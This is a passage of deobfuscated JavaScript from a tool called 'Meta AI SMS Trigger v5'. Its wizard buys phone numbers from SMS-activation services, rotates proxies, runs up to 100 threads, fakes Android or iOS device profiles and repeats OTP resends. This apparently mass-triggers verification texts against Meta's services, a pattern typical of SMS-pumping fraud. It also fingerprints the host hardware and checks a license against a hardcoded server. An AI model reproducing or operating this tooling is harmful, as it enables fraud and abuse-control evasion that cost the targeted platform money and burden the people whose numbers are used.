        v646.name = "❌ Exit Program", v646.value = "exit";
        const v647 = await selectOption("SELECT NUMBER SOURCE", [v640, v641, v642, v643, v644, v645, v646]);
        if (v647 === "exit") process.exit(0);
        v624 = v647, v623 = 2;
      } else {
        if (v623 === 2) {
          if (v624 === "file") {
            {
              const v648 = await selectOption("SELECT TARGET NUMBERS FILE", [{
                'name': "✏️ Custom File Path",
                'value': "custom"
              }, {
                'name': "⬅️ Go Back to Number Source",
                'value': "back"
              }]);
              if (v648 === "back") {
                {
                  v623 = 1;
                  continue;
                }
              }
              if (v648 === "custom") {
                {
                  const v649 = await promptText("Enter Numbers File Path:", "numbers.txt");
                  if (v649.toLowerCase() === "back") continue;
                  v625 = v649;
                }
              } else v625 = v648;
              if (!fs.existsSync(v625)) fs.writeFileSync(v625, '');
              v626 = null, v623 = 3;
            }
          } else {
            if (v624 === "voltx" || v624 === "stex") {
              {
                const v650 = v624 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
                  v651 = v624 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
                  v652 = v624 === "voltx" ? TWOOO_VOLTX_GET : TWOOO_STEX_GET,
                  v653 = v624 === "voltx" ? TWOOO_VOLTX_CONSOLE : TWOOO_STEX_CONSOLE;
                let v654 = '',
                  v655 = [],
                  v656 = 50,
                  v657 = false,
                  v658 = 1;
                while (v658 <= 3 && !v657) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v658 === 1) {
                    {
                      if (fs.existsSync(v651)) {
                        {
                          v654 = fs.readFileSync(v651, "utf8").trim();
                          const v659 = await selectOption(v650 + " key found (" + v654.substring(0, 10) + "...)", [{
                            'name': "Use saved key",
                            'value': "use"
                          }, {
                            'name': "Enter new key",
                            'value': "new"
                          }, {
                            'name': "Remove saved key",
                            'value': "remove"
                          }, {
                            'name': "⬅️ Back",
                            'value': "back"
                          }]);
                          if (v659 === "back") {
                            {
                              v657 = true;
                              break;
                            }
                          }
                          if (v659 === "remove") fs.existsSync(v651) && fs.unlinkSync(v651), v654 = '';else v659 === "new" && (v654 = '');
                        }
                      }
                      if (!v654) {
                        const v660 = await promptText("Enter " + v650 + " API Key (mauthapi):", '');
                        if (v660.toLowerCase() === "back") {
                          v657 = true;
                          break;
                        }
                        v654 = v660;
                        const v661 = {};
                        v661.name = 'No', v661.value = 'no';
                        const v662 = await selectOption("Save key?", [{
                          'name': "Yes",
                          'value': "yes"
                        }, v661]);
                        if (v662 === "yes" && v654) fs.writeFileSync(v651, v654, "utf8");
                      }
                      if (v654) v658 = 2;
                    }
                  } else {
                    if (v658 === 2) {
                      {
                        const v663 = await selectOption("How to select ranges?", [{
                          'name': "🔍 Auto Range Finder (scan console)",
                          'value': "auto"
                        }, {
                          'name': "✏️  Enter manually",
                          'value': "manual"
                        }, {
                          'name': "⬅️ Back",
                          'value': "back"
                        }]);
                        if (v663 === "back") {
                          {
                            v658 = 1;
                            continue;
                          }
                        }
                        if (v663 === "auto") {
                          const v664 = await autoRangeFinderFor2Oo(v654, v653, selectOption, promptText);
                          v664 && v664.length > 0 && (v655 = v664, v658 = 3);
                        } else {
                          {
                            v655 = [];
                            let v665 = true;
                            while (v665) {
                              {
                                const v666 = await promptText("Enter range #" + (v655.length + 1) + " (e.g. 26134XXX) or 'back':", '');
                                if (v666.toLowerCase() === "back") {
                                  {
                                    if (v655.length === 0) break;else {
                                      {
                                        v655.pop();
                                        continue;
                                      }
                                    }
                                  }
                                }
                                if (v666) v655.push(v666);
                                const v667 = {};
                                v667.name = 'No', v667.value = 'no';
                                const v668 = await selectOption("Added " + v655.length + ". Add another?", [{
                                  'name': "Yes",
                                  'value': "yes"
                                }, v667]);
                                if (v668 === 'no') v665 = false;
                              }
                            }
                            if (v655.length > 0) v658 = 3;
                          }
                        }
                      }
                    } else {
                      if (v658 === 3) {
                        {
                          const v669 = await promptText("How many numbers? [default:50]:", '50');
                          if (v669.toLowerCase() === "back") {
                            {
                              v658 = 2;
                              continue;
                            }
                          }
                          v656 = parseInt(v669) || 50;
                          const v670 = {};
                          v670.provider = v624, v670.apiKey = v654, v670.getPath = v652, v670.consolePath = v653, v670.ranges = v655, v670.totalCount = v656, v627 = v670, v626 = null, v658 = 4;
                        }
                      }
                    }
                  }
                }
                if (v657) {
                  v623 = 1;
                  continue;
                }
                v623 = 3;
              }
            } else {
              if (v624 === "smsbower") {
                let v671 = '',
                  v672 = 'fb',
                  v673 = '0',
                  v674 = "0.5",
                  v675 = 50,
                  v676 = 1,
                  v677 = false;
                while (v676 <= 4 && !v677) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v676 === 1) {
                    if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                      {
                        v671 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                        const v678 = await selectOption("SMS Bower key found (" + v671.substring(0, 10) + "...)", [{
                          'name': "Use saved key",
                          'value': "use"
                        }, {
                          'name': "Enter new key",
                          'value': "new"
                        }, {
                          'name': "Remove saved key",
                          'value': "remove"
                        }, {
                          'name': "⬅️ Back",
                          'value': "back"
                        }]);
                        if (v678 === "back") {
                          v677 = true;
                          break;
                        }
                        if (v678 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v671 = '';else {
                          if (v678 === "new") v671 = '';
                        }
                      }
                    }
                    if (!v671) {
                      {
                        v671 = await promptText("Enter SMS Bower API Key:", '');
                        if (v671.toLowerCase() === "back") {
                          {
                            v677 = true;
                            break;
                          }
                        }
                        const v679 = {};
                        v679.name = 'No', v679.value = 'no';
                        const v680 = await selectOption("Save key?", [{
                          'name': "Yes",
                          'value': "yes"
                        }, v679]);
                        if (v680 === "yes" && v671) fs.writeFileSync(SMSBOWER_KEY_FILE, v671, "utf8");
                      }
                    }
                    if (v671) v676 = 2;
                  } else {
                    if (v676 === 2) {
                      v672 = await promptText("Service code (e.g. fb, ig, wa) [default: fb]:", 'fb');
                      if (v672.toLowerCase() === "back") {
                        v676 = 1;
                        continue;
                      }
                      v672 = v672 || 'fb', v676 = 3;
                    } else {
                      if (v676 === 3) {
                        {
                          v673 = await promptText("Country code (0 = any) [default: 0]:", '0');
                          if (v673.toLowerCase() === "back") {
                            v676 = 2;
                            continue;
                          }
                          v673 = v673 || '0';
                          const v681 = await promptText("Max price per number [default: 0.5]:", "0.5");
                          v674 = v681 || "0.5", v676 = 4;
                        }
                      } else {
                        if (v676 === 4) {
                          const v682 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v682.toLowerCase() === "back") {
                            v676 = 3;
                            continue;
                          }
                          v675 = parseInt(v682) || 50;
                          const v683 = {};
                          v683.apiKey = v671, v683.service = v672, v683.country = v673, v683.maxPrice = v674, v683.totalCount = v675, v628 = v683, v626 = null, v627 = null, v629 = null, v676 = 5;
                        }
                      }
                    }
                  }
                }
                if (v677) {
                  {
                    v623 = 1;
                    continue;
                  }
                }
                v623 = 3;
              } else {
                if (v624 === "zenex") {
                  {
                    let v684 = '',
                      v685 = [],
                      v686 = 50,
                      v687 = 1,
                      v688 = false;
                    while (v687 <= 3 && !v688) {
                      process.stdout.write("[2J[H"), printHeader();
                      if (v687 === 1) {
                        {
                          if (fs.existsSync(ZENEX_KEY_FILE)) {
                            v684 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                            const v689 = await selectOption("Zenex key found (" + v684.substring(0, 10) + "...)", [{
                              'name': "Use saved key",
                              'value': "use"
                            }, {
                              'name': "Enter new key",
                              'value': "new"
                            }, {
                              'name': "Remove saved key",
                              'value': "remove"
                            }, {
                              'name': "⬅️ Back",
                              'value': "back"
                            }]);
                            if (v689 === "back") {
                              v688 = true;
                              break;
                            }
                            if (v689 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v684 = '';else {
                              if (v689 === "new") v684 = '';
                            }
                          }
                          if (!v684) {
                            v684 = await promptText("Enter Zenex API Key (mapikey):", '');
                            if (v684.toLowerCase() === "back") {
                              v688 = true;
                              break;
                            }
                            const v690 = {};
                            v690.name = 'No', v690.value = 'no';
                            const v691 = await selectOption("Save key?", [{
                              'name': "Yes",
                              'value': "yes"
                            }, v690]);
                            if (v691 === "yes" && v684) fs.writeFileSync(ZENEX_KEY_FILE, v684, "utf8");
                          }
                          if (v684) v687 = 2;
                        }
                      } else {
                        if (v687 === 2) {
                          {
                            v685 = [];
                            let v692 = true;
                            while (v692) {
                              const v693 = await promptText("Enter range #" + (v685.length + 1) + " (e.g. 4473845XXX) or 'back':", '');
                              if (v693.toLowerCase() === "back") {
                                if (v685.length === 0) {
                                  {
                                    v688 = true;
                                    break;
                                  }
                                } else {
                                  v685.pop();
                                  continue;
                                }
                              }
                              if (v693) v685.push(v693);
                              const v694 = {};
                              v694.name = 'No', v694.value = 'no';
                              const v695 = await selectOption("Added " + v685.length + ". Add another?", [{
                                'name': "Yes",
                                'value': "yes"
                              }, v694]);
                              if (v695 === 'no') v692 = false;
                            }
                            if (v685.length > 0) v687 = 3;
                          }
                        } else {
                          if (v687 === 3) {
                            {
                              const v696 = await promptText("How many numbers? [default: 50]:", '50');
                              if (v696.toLowerCase() === "back") {
                                {
                                  v687 = 2;
                                  continue;
                                }
                              }
                              v686 = parseInt(v696) || 50;
                              const v697 = {};
                              v697.apiKey = v684, v697.ranges = v685, v697.totalCount = v686, v629 = v697, v626 = null, v627 = null, v628 = null, v687 = 4;
                            }
                          }
                        }
                      }
                    }
                    if (v688) {
                      {
                        v623 = 1;
                        continue;
                      }
                    }
                    v623 = 3;
                  }
                } else {
                  let v698 = 1,
                    v699 = false;
                  while (v698 <= 4 && !v699) {
                    {
                      process.stdout.write("[2J[H"), printHeader();
                      if (v698 === 1) {
                        if (fs.existsSync(v639)) {
                          {
                            const v700 = fs.readFileSync(v639, "utf8").trim(),
                              v701 = {};
                            v701.name = "Yes, use saved key", v701.value = "yes";
                            const v702 = {};
                            v702.name = "No, enter new key", v702.value = 'no';
                            const v703 = {};
                            v703.name = "Delete saved key", v703.value = "delete";
                            const v704 = {};
                            v704.name = "⬅️ Go Back to Number Source", v704.value = "back";
                            const v705 = await selectOption("Found saved API Key (..." + v700.slice(-4) + "). Use it?", [v701, v702, v703, v704]);
                            if (v705 === "back") {
                              {
                                v699 = true;
                                break;
                              }
                            }
                            if (v705 === "yes") v635 = v700;else {
                              if (v705 === "delete") {
                                if (fs.existsSync(v639)) fs.unlinkSync(v639);
                                v635 = '';
                              }
                            }
                          }
                        }
                        if (!v635) {
                          const v706 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                          if (v706.toLowerCase() === "back") {
                            v699 = true;
                            break;
                          }
                          v635 = v706;
                          const v707 = {};
                          v707.name = 'No', v707.value = 'no';
                          const v708 = await selectOption("Save this key for future use?", [{
                            'name': "Yes, save it",
                            'value': "yes"
                          }, v707]);
                          if (v708 === "yes" && v635) {
                            fs.writeFileSync(v639, v635, "utf8");
                          }
                        }
                        if (v635) v698 = 2;
                      } else {
                        if (v698 === 2) {
                          {
                            v636 = [];
                            let v709 = true;
                            while (v709) {
                              const v710 = await promptText("Enter range #" + (v636.length + 1) + " (e.g. 21624485XXX) or type 'back':", '');
                              if (v710.toLowerCase() === "back") {
                                if (v636.length === 0) {
                                  v698 = 1;
                                  break;
                                } else {
                                  {
                                    v636.pop();
                                    continue;
                                  }
                                }
                              }
                              if (v710) v636.push(v710);
                              const v711 = await selectOption("Added " + v636.length + " range(s). Add another?", [{
                                'name': "Yes, add another range",
                                'value': "yes"
                              }, {
                                'name': "No, proceed to next step",
                                'value': 'no'
                              }, {
                                'name': "⬅️ Go Back to API Key",
                                'value': "back"
                              }]);
                              if (v711 === "back") {
                                {
                                  v698 = 1;
                                  break;
                                }
                              }
                              if (v711 === 'no') v709 = false;
                            }
                            if (v636.length > 0) v698 = 3;
                          }
                        } else {
                          if (v698 === 3) {
                            {
                              const v712 = await promptText("How many numbers to process? (type 'back' to go back) [default: 50]:", '50');
                              if (v712.toLowerCase() === "back") {
                                v698 = 2;
                                continue;
                              }
                              v637 = parseInt(v712) || 50, v698 = 4;
                            }
                          } else {
                            if (v698 === 4) {
                              {
                                const v713 = await selectOption("SELECT NEXA SERVER", [{
                                  'name': "Server 1 (/get)",
                                  'value': "/api/v1/numbers/get"
                                }, {
                                  'name': "Server 2 (/p2/get)",
                                  'value': "/api/v1/numbers/p2/get"
                                }, {
                                  'name': "Server 3 (/p3/get)",
                                  'value': "/api/v1/numbers/p3/get"
                                }, {
                                  'name': "⬅️ Go Back to Count Input",
                                  'value': "back"
                                }]);
                                if (v713 === "back") {
                                  v698 = 3;
                                  continue;
                                }
                                v638 = v713;
                                const v714 = {};
                                v714.apiKey = v635, v714.ranges = v636, v714.totalCount = v637, v714.serverEndpoint = v638, v626 = v714, v698 = 5;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                  if (v699) {
                    {
                      v623 = 1;
                      continue;
                    }
                  }
                  v623 = 3;
                }
              }
            }
          }
        } else {
          if (v623 === 3) {
            {
              const v715 = await selectOption("SELECT PROXIES FILE", [{
                'name': "✏️ Custom File Path",
                'value': "custom"
              }, {
                'name': "🚫 None (Direct Connection)",
                'value': "none"
              }, {
                'name': "⬅️ Go Back to Numbers Selection",
                'value': "back"
              }]);
              if (v715 === "back") {
                v623 = 2;
                continue;
              }
              if (v715 === "custom") {
                {
                  const v716 = await promptText("Enter Proxies File Path:", "proxies.txt");
                  if (v716.toLowerCase() === "back") continue;
                  v630 = v716;
                }
              } else v715 === "none" ? v630 = '' : v630 = v715;
              v623 = 4;
            }
          } else {
            if (v623 === 4) {
              const v717 = await selectOption("SELECT THREADS", [{
                'name': "10 Threads",
                'value': 0xa
              }, {
                'name': "20 Threads (Default)",
                'value': 0x14
              }, {
                'name': "50 Threads (Fast)",
                'value': 0x32
              }, {
                'name': "100 Threads (Extreme)",
                'value': 0x64
              }, {
                'name': "⌨️  Custom...",
                'value': -1
              }, {
                'name': "⬅️ Go Back to Proxies Selection",
                'value': "back"
              }]);
              if (v717 === "back") {
                v623 = 3;
                continue;
              }
              if (v717 === -1) {
                const v718 = await promptText("Enter custom thread count (type 'back' to go back):", '20');
                if (v718.toLowerCase() === "back") continue;
                v631 = parseInt(v718) || 20;
              } else v631 = v717;
              v623 = 5;
            } else {
              if (v623 === 5) {
                {
                  const v719 = await selectOption("SELECT REGION", [{
                    'name': "🎲 Random",
                    'value': "random"
                  }, {
                    'name': "🇺🇸 English (en-US)",
                    'value': "en-US"
                  }, {
                    'name': "🇪🇸 Spanish (es-ES)",
                    'value': "es-ES"
                  }, {
                    'name': "⬅️ Go Back to Threads Selection",
                    'value': "back"
                  }]);
                  if (v719 === "back") {
                    {
                      v623 = 4;
                      continue;
                    }
                  }
                  v632 = v719, v623 = 6;
                }
              } else {
                if (v623 === 6) {
                  const v720 = await selectOption("SELECT DEVICE PROFILE", [{
                    'name': "🎲 Random (Android + iOS)",
                    'value': "random"
                  }, {
                    'name': "📱 Android App (Stella)",
                    'value': "android"
                  }, {
                    'name': "🍎 iOS App (Stella)",
                    'value': "ios"
                  }, {
                    'name': "⬅️ Go Back to Region Selection",
                    'value': "back"
                  }]);
                  if (v720 === "back") {
                    v623 = 5;
                    continue;
                  }
                  v633 = v720, v623 = 7;
                } else {
                  if (v623 === 7) {
                    const v721 = await promptText("Enter number of OTP resends per number (type 'back' to go back) [default: 0]:", '0');
                    if (v721.toLowerCase() === "back") {
                      v623 = 6;
                      continue;
                    }
                    v634 = parseInt(v721) || 0, v623 = 8;
                  } else {
                    if (v623 === 8) break;
                  }
                }
              }
            }
          }
        }
      }
    }
    return process.stdin.pause(), {
      'numbersFile': v625,
      'threads': String(v631),
      'proxiesFile': v630,
      'region': v632,
      'browser': v633,
      'resends': String(v634),
      'nexaConfig': v626,
      'twoOoConfig': v627,
      'smsBowerConfig': v628,
      'zenexConfig': v629
    };
  }
  function generateHWID() {
    const v722 = require('os'),
      v723 = v722.platform();
    try {
      if (v723 === "win32") {
        const v724 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
          'stdio': "pipe",
          'timeout': 0x3a98
        }).toString().trim();
        if (!v724) throw new Error("No hardware data");
        const v725 = crypto.createHash("sha256").update(v724).digest("hex").toUpperCase();
        return "SKING-" + v725.substring(0, 8) + '-' + v725.substring(8, 12) + '-' + v725.substring(12, 16);
      } else {
        {
          let v726 = [];
          try {
            {
              const v729 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
                'stdio': "pipe",
                'timeout': 0x1388
              }).toString().trim();
              if (v729 && v729 !== "null") v726.push('A:' + v729);
            }
          } catch (v730) {}
          try {
            {
              if (fs.existsSync("/proc/cpuinfo")) {
                {
                  const v731 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                    v732 = v731.match(/Serial\s*:\s*(\S+)/i),
                    v733 = v731.match(/Hardware\s*:\s*(.+)/i);
                  if (v732 && v732[1] !== "0000000000000000") v726.push('S:' + v732[1].trim());
                  if (v733) v726.push('H:' + v733[1].trim());
                }
              }
            }
          } catch (v734) {}
          try {
            {
              if (fs.existsSync("/etc/machine-id")) {
                {
                  const v735 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                  if (v735) v726.push('M:' + v735);
                }
              }
            }
          } catch (v736) {}
          try {
            {
              const v737 = v722.cpus(),
                v738 = v737 && v737.length > 0 ? v737[0].model : "UnknownCPU",
                v739 = v722.totalmem(),
                v740 = v722.release(),
                v741 = v722.hostname();
              v726.push('F:' + v738 + '|' + v739 + '|' + v740 + '|' + v741);
            }
          } catch (v742) {}
          const v727 = v726.join('||'),
            v728 = crypto.createHash("sha256").update(v727).digest("hex").toUpperCase();
          return "ANKING-" + v728.substring(0, 8) + '-' + v728.substring(8, 12) + '-' + v728.substring(12, 16);
        }
      }
    } catch (v743) {
      return '';
    }
  }
  function verifyServerSignature(v744, v745) {
    if (!v745) return false;
    const v746 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v744, "utf8"), v746, Buffer.from(v745, "base64"));
    } catch (v747) {
      return false;
    }
  }
  async function start() {
    const v748 = generateHWID();
    if (!v748) {
      console.error(R("\n  ✗ Could not generate Hardware ID.")), console.error(R("  ✗ Please run on Windows or provide HWID as argument.\n")), process.exit(1);
    }
    const v749 = generateHWID();
    if (v749 !== v748) {
      console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1);
    }
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + C("Meta AI SMS Trigger v5        ") + W('│')), console.log(W("│ [•] Your HWID : ") + Y(v748.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v750 = false;
    let v751 = "Licensed";
    const v752 = Date.now();
    try {
      {
        const v766 = "188.137.176.163",
          v767 = await new Promise((v768, v769) => {
            const v770 = {};
            v770.hwid = v748, v770.app_id = "Meta Apk", v770.version = "2.0.2", v770.timestamp = v752;
            const v771 = JSON.stringify(v770),
              v772 = {
                'hostname': v766,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v771)
                },
                'timeout': 0x2710
              };
            const v773 = http.request(v772, v774 => {
              {
                let v775 = '';
                v774.on("data", v776 => v775 += v776), v774.on("end", () => {
                  try {
                    v768(JSON.parse(v775));
                  } catch (v777) {
                    v769(v777);
                  }
                });
              }
            });
            v773.on("error", v769), v773.on("timeout", function () {
              this.destroy(), v769(new Error("Timeout"));
            }), v773.write(v771), v773.end();
          });
        if (v767) {
          v767.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v767.status === "banned" || v767.status === "expired" || !v767.sig) {
            {
              await new Promise(v782 => setTimeout(v782, 2000));
              let v781 = String(v767.reason || "NOT REGISTERED");
              if (!v767.reason && !v767.sig) v781 = "NOT REGISTERED / REMOVED";
              console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — META TOOL     ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v748.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v781.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
            }
          }
          const v778 = "Meta Apk",
            v779 = v748 + '|' + v778 + "|2.0.2|" + v752;
          if (!verifyServerSignature(v779, v767.sig)) {
            console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1);
          }
          v750 = true;
          let v780 = v767.token;
          !v780 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
            !v780 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
            const v783 = {};
            v783.hwid = v748, v783.app_id = v778, v783.token = v780;
            const v784 = JSON.stringify(v783),
              v785 = {
                'hostname': v766,
                'port': 0xec1,
                'path': "/api/ping",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v784)
                },
                'timeout': 0x1388
              },
              v786 = http.request(v785, v787 => {
                {
                  let v788 = '';
                  v787.on("data", v789 => v788 += v789), v787.on("end", () => {
                    try {
                      const v790 = JSON.parse(v788);
                      if (v790.status === 'ok' && v790.token) v780 = v790.token;else {
                        console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1);
                      }
                    } catch (v791) {
                      console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                    }
                  });
                }
              });
            v786.on("error", () => {
              console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n")), process.exit(1);
            });
            v786.on("timeout", function () {
              this.destroy();
              console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
              process.exit(1);
            });
            v786.write(v784), v786.end();
          }, 45000);
        }
      }
    } catch (v792) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    if (!v750) {
      console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1);
    }
    const v753 = process.argv.slice(2).filter(v793 => !v793.startsWith('--'));
    let v754 = v753,
      v755 = null,
      v756 = null,
      v757 = null,
      v758 = null;
    if (v754.length === 0) {
      const v794 = await interactiveWizard();
      v754 = [v794.numbersFile, v794.threads, v794.proxiesFile, v794.region, v794.browser, "SKING-UI-HARDWARE-ID", v794.resends], v755 = v794.nexaConfig, v756 = v794.twoOoConfig || null, v757 = v794.smsBowerConfig || null, v758 = v794.zenexConfig || null;
    }
    v754 = v754.map(v795 => {
      {
        if (typeof v795 === "string") {
          if (v795.startsWith('\x22') && v795.endsWith('\x22')) return v795.slice(1, -1);
          if (v795.startsWith('\x27') && v795.endsWith('\x27')) return v795.slice(1, -1);
        }
        return v795;
      }
    });
    let v759 = path.resolve(v754[0] || "numbers.txt"),
      v760 = parseInt(v754[1]) || 20,
      v761 = v754[2] !== undefined ? v754[2] : "proxies.txt";
    if (v761.toLowerCase() === "none" || v761 === "false") v761 = '';
    let v762 = v754[3] || "random",
      v763 = v754[4] || "random",
      v764 = parseInt(v754[6]) || 0;
    v761 && !v761.includes(':') && !path.isAbsolute(v761) && (v761 = path.resolve(v761));
    printHeader(), console.log(B("  ✓ License: " + v751) + G(" | HWID: " + v748));
    let v765 = true;
    while (v765) {
      let v796 = [];
      if (!v755 && !v756 && !v757 && !v758) {
        {
          !fs.existsSync(v759) && (console.error(R("✗ Error: Numbers file not found: " + v759)), process.exit(1));
          v796 = fs.readFileSync(v759, "utf8").split(/\r?\n/).map(v819 => v819.trim()).filter(v820 => v820 && v820.replace(/\D/g, '').length >= 7);
          if (v796.length === 0) {
            console.error(R("✗ No valid phone numbers found in file")), process.exit(1);
          }
        }
      }
      let v797 = [];
      if (v761 && fs.existsSync(v761)) {
        v797 = fs.readFileSync(v761, "utf8").split('\x0a').map(v821 => v821.trim()).filter(v822 => v822.length > 0 && !v822.startsWith('#'));
      }
      let v798 = [];
      for (const v823 of v797) {
        {
          const v824 = parseProxy(v823);
          if (!v824) {
            {
              {
                console.error(R("\n  ✗ Invalid proxy format detected: \"" + v823 + '\x22'));
                console.error(R("  Please use one of the supported formats:"));
                console.error(R("    - host:port"));
                console.error(R("    - user:pass@host:port"));
                console.error(R("    - host:port:user:pass"));
                console.error(R("    - user:pass:host:port\n"));
                process.exit(1);
              }
            }
          }
          v798.push(v824);
        }
      }
      const v799 = v755 || v756 || v757 || v758;
      if (v799) {
        {
          const v825 = v755 ? "NexaOTP" : v756 ? v756.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v757 ? "📱 SMS Bower" : "⚡ Zenex";
          console.log(C("✓ Target  : " + v825 + " API (" + v799.totalCount + " numbers)"));
        }
      } else console.log(Y("✓ Loaded " + v796.length + " targets"));
      if (v798.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v798.length));
      console.log(C("✓ Threads: " + v760 + '\x0a'));
      const v800 = "successful.txt",
        v801 = "failed.txt";
      fs.writeFileSync(v800, ''), fs.writeFileSync(v801, '');
      const v802 = new Dashboard(v799 ? v799.totalCount : v796.length);
      let v803 = [],
        v804 = [],
        v805 = 0,
        v806 = false;
      if (v755 || v756) {
        {
          const v826 = v755 ? "NexaOTP" : v756.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥";
          (async () => {
            {
              let v827 = 0,
                v828 = '';
              try {
                for (let v829 = 0; v829 < v799.totalCount; v829++) {
                  try {
                    {
                      const v830 = v799.ranges[Math.floor(Math.random() * v799.ranges.length)];
                      let v831;
                      v755 ? v831 = await nexaLimiter.enqueue(() => nexaFetchNumber(v755.apiKey, v830, v755.serverEndpoint)) : v831 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v756.apiKey, v830, v756.getPath));
                      if (v831) {
                        v805++, v827 = 0, v804.length > 0 ? v804.shift()(v831) : v803.push(v831);
                      }
                    }
                  } catch (v832) {
                    v828 = v832.message, v827++;
                    if (v832.message.includes("Insufficient balance")) {
                      {
                        console.error(R("\n  [" + v826 + "] ✗ Insufficient balance — aborting.\n"));
                        break;
                      }
                    }
                    if (v832.message.includes("No numbers available")) {
                      continue;
                    }
                    if (v827 >= 5 && v805 === 0) {
                      console.error(R("\n  [" + v826 + "] ✗ Aborting — 5 consecutive fetch failures.")), console.error(R("  Last error: " + v828)), console.error(R("  Check your API key, range format (e.g. 26134XXX), and internet connection.\n"));
                      break;
                    }
                  }
                }
              } finally {
                {
                  v805 === 0 ? console.error(R("\n  [" + v826 + "] ✗ No numbers were fetched. Last error: " + (v828 || "Unknown") + '\x0a')) : console.log(G("\n  [" + v826 + "] ✓ Feeder done — " + v805 + " numbers fetched.\n"));
                  v806 = true;
                  while (v804.length > 0) v804.shift()(null);
                }
              }
            }
          })();
        }
      } else {
        if (v757) {
          {
            const v833 = v757;
            (async () => {
              {
                let v834 = 0;
                try {
                  for (let v835 = 0; v835 < v833.totalCount; v835++) {
                    try {
                      const {
                        activationId: v836,
                        phoneNumber: v837
                      } = await smsBowerFetchNumber(v833.apiKey, v833.service, v833.country, v833.maxPrice);
                      v805++, v834 = 0;
                      if (v804.length > 0) v804.shift()(v837);else v803.push(v837);
                    } catch (v838) {
                      v834++;
                      if (v834 >= 5 && v805 === 0) break;
                      await new Promise(v839 => setTimeout(v839, 2000));
                    }
                  }
                } finally {
                  {
                    v806 = true;
                    while (v804.length > 0) v804.shift()(null);
                  }
                }
              }
            })();
          }
        } else {
          if (v758) {
            {
              const v840 = v758;
              (async () => {
                let v841 = 0;
                try {
                  for (let v842 = 0; v842 < v840.totalCount; v842++) {
                    try {
                      {
                        const v843 = v840.ranges[Math.floor(Math.random() * v840.ranges.length)],
                          v844 = await zenexFetchNumber(v840.apiKey, v843);
                        v805++, v841 = 0;
                        if (v804.length > 0) v804.shift()(v844);else v803.push(v844);
                      }
                    } catch (v845) {
                      v841++;
                      if (v841 >= 5 && v805 === 0) break;
                      await new Promise(v846 => setTimeout(v846, 2000));
                    }
                  }
                } finally {
                  {
                    v806 = true;
                    while (v804.length > 0) v804.shift()(null);
                  }
                }
              })();
            }
          }
        }
      }
      const v807 = !!(v755 || v756 || v757 || v758),
        v808 = v807 ? () => {
          if (v803.length > 0) return Promise.resolve(v803.shift());
          if (v806) return Promise.resolve(null);
          return new Promise(v847 => v804.push(v847));
        } : (() => {
          {
            let v848 = null;
            const fn10 = () => {
              if (v848) clearTimeout(v848);
              v848 = setTimeout(() => {
                try {
                  fs.writeFileSync(v759, v796.join('\x0a'), "utf8");
                } catch (v849) {}
              }, 50);
            };
            return () => {
              {
                if (v796.length === 0) return Promise.resolve(null);
                const v850 = Math.floor(Math.random() * v796.length),
